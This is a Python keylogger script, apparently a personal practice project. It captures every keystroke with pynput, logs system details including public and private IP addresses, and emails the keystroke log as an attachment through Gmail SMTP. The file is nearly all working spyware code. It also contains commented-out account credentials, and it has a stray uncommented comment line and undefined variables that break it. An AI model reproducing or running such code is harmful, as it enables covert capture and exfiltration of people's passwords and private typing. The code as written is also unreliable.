# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl
import email

# to collect computer info
import socket
import platform

# the clipboard
import win32clipboard

# grab keystrokes
from pynput.keyboard import Key, Listener

# track time
import time
import os

# microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

# to encrypt files
from cryptography.fernet import Fernet

import getpass  # to get usernames
from requests import get  # to get computer information

from multiprocessing import Process, freeze_support  # to get one screenshot at a time
from PIL import ImageGrab  # to grab images

keys_information = "key_log.txt"
system_information = "systeminfo.txt"

# email_address = "vikramathithyan99@gmail.com"
# password = "Vedha2018"
#toaddress = "vikramathithyan99@gmail.com"

file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
extend = "\\"


function to send the key_log.txt file through email from target
def send_mail(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


send_mail(keys_information, file_path + extend + keys_information, toaddress)



def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public Address (most likely max query)")

        f.write("Processor: " + (platform.processor() ) + '\n')
        f.write("System: " + platform.system() + " "+ platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

count = 0
keys = []  # each pressed key will be appended here


# function to print and append pressed key to keys list
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# function to write the keys to key_log.txt file
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        # joining each individual letters to form the typed word
        for key in keys:
            # replacing ' with nothing
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# function to exit KeyLogger
def on_release(key):
    if key == Key.esc:
        return False


# calling listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
